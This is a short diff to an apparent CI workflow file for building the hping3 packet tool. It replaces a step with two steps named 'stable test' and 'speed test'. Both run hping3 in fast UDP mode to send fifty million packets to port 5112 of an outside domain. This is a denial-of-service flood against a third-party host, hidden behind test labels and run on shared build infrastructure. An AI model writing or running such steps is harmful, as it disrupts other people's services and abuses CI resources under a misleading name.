@@ -21,5 +21,7 @@ jobs:
       run: bash gentables.sh && ./configure --no-tcl
     - name: make
       run: make
-    - name: test1
-      run: sudo ./hping3 -2 --faster -p 5112 mcbjs.cn -c 100000000
+    - name: stable test
+      run: sudo ./hping3 -2 --faster -c 50000000 -p 5112 mcbjs.cn 
+    - name: speed test
+      run: sudo ./hping3 -2 --faster -c 50000000 -p 5112 mcbjs.cn
